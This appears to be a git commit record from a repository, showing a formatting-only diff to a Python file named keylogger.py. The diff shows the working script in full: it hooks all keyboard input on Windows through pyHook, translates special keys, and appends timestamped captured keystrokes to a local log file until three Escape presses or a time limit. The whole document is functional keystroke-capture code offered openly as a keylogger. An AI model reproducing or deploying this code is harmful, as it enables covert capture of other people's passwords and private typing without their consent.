2a7ca50c5011237b3a2019f28051e32eaeed8d36
Nip404 <57417504+Nip404@users.noreply.github.com>
2019-11-05 22:57:06 +0000

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -8,28 +8,28 @@ import os
 string = ""
 t0 = time.time()
 keymap = {
-    "Space":" ",
-    "Back":"<Backspace>",
-    "Return":"<Enter>",
-    "Up":"<Up>",
-    "Down":"<Down>",
-    "Left":"<Left>",
-    "Right":"<Right>",
-    "Escape":"<ESC>",
-    "Lshift":"<Shift>",
-    "Rshift":"<Shift>",
-    "Oem_Period":".",
-    "Oem_Comma":",",
-    "Oem_7":"#",
-    "Lcontrol":"<CTRL>",
-    "Delete":"<DEL>",
-    "Tab":"<TAB>",
-    "Capital":"<CAPS>",
-    "Oem_2":"/",
-    "Oem_1":";",
-    "Lwin":"<WIN>",
-    "Rmenu":"<ALT>",
-    "Lmenu":"<ALT>"
+    "Space": " ",
+    "Back": "<Backspace>",
+    "Return": "<Enter>",
+    "Up": "<Up>",
+    "Down": "<Down>",
+    "Left": "<Left>",
+    "Right": "<Right>",
+    "Escape": "<ESC>",
+    "Lshift": "<Shift>",
+    "Rshift": "<Shift>",
+    "Oem_Period": ".",
+    "Oem_Comma": ",",
+    "Oem_7": "#",
+    "Lcontrol": "<CTRL>",
+    "Delete": "<DEL>",
+    "Tab": "<TAB>",
+    "Capital": "<CAPS>",
+    "Oem_2": "/",
+    "Oem_1": ";",
+    "Lwin": "<WIN>",
+    "Rmenu": "<ALT>",
+    "Lmenu": "<ALT>"
 }
 
 maxTime = None # if max = None, unlimited
@@ -37,29 +37,29 @@ saveInterval = 0.2
 
 def keypressed(event):
     global string
-    string += keymap.get(str(event.GetKey()),str(event.GetKey()))
+    string += keymap.get(str(event.GetKey()), str(event.GetKey()))
     return True 
 
 obj = pyHook.HookManager()
 obj.KeyDown = keypressed
 obj.HookKeyboard()
 
-with open("keylog.txt","a+") as f:
+with open("keylog.txt", "a+") as f:
     while True:
         try:
             t1 = time.time()
             pythoncom.PumpWaitingMessages()
             
-            if not int(t1-t0) % (saveInterval*60) and int(t1-t0) and string:
+            if not int(t1-t0) % (saveInterval * 60) and int(t1 - t0) and string:
                 f.write(f"[INTERVAL SAVE] {str(datetime.datetime.now()).split('.')[0]}: {f.read()}{string}\n\n")
                 string = ""
 
-            elif keymap["Escape"]*3 in string or (maxTime is not None and t1-t0 >= maxTime * 60):
+            elif keymap["Escape"] * 3 in string or (maxTime is not None and t1 - t0 >= maxTime * 60):
                 break
 
         except Exception as e:
             print(e)
         
-    f.write(f"[MANUAL SAVE] {str(datetime.datetime.now()).split('.')[0]}: {f.read()}{string[:-len(keymap['Escape'])*3]}\n\n")
+    f.write(f"[MANUAL SAVE] {str(datetime.datetime.now()).split('.')[0]}: {f.read()}{string[:-len(keymap['Escape']) * 3]}\n\n")
     f.close()
     sys.exit()
